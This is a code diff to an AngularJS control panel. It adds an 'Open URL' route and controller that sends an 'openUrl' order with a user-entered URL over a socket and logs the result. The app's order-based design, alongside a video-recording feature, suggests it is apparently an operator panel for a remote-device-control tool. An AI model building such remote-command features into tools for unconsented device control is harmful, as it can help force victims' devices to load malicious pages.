@@ -69,7 +69,39 @@ app.config(function ($routeProvider) {
         .when("/videoRecording", {
             templateUrl: "./views/videoRecording.html",
             controller: "VidCtrl"
-        });
+        })
+        .when("/openUrl", {
+            templateUrl: "./views/openUrl.html",
+            controller: "UrlCtrl"
+    });
+});
+
+//-----------------------Open URL Controller (openUrl.htm)------------------------
+app.controller("UrlCtrl", function ($scope, $rootScope) {
+    $UrlCtrl = $scope;
+    var openUrl = CONSTANTS.orders.openUrl;
+
+    $UrlCtrl.$on('$destroy', () => {
+        socket.removeAllListeners(openUrl);
+    });
+
+    $UrlCtrl.Go = () => {
+        if (!$UrlCtrl.url) return;
+        $UrlCtrl.load = 'loading';
+        $rootScope.Log('Opening URL: ' + $UrlCtrl.url);
+        socket.emit(ORDER, { order: openUrl, url: $UrlCtrl.url });
+    }
+
+    socket.on(openUrl, (data) => {
+        $UrlCtrl.load = '';
+        if (data.done) {
+            $rootScope.Log('URL opened successfully', CONSTANTS.logStatus.SUCCESS);
+            $UrlCtrl.$apply();
+        } else if (data.error) {
+            $rootScope.Log('Open URL failed: ' + data.error, CONSTANTS.logStatus.FAIL);
+            $UrlCtrl.$apply();
+        }
+    });
 });
 
 
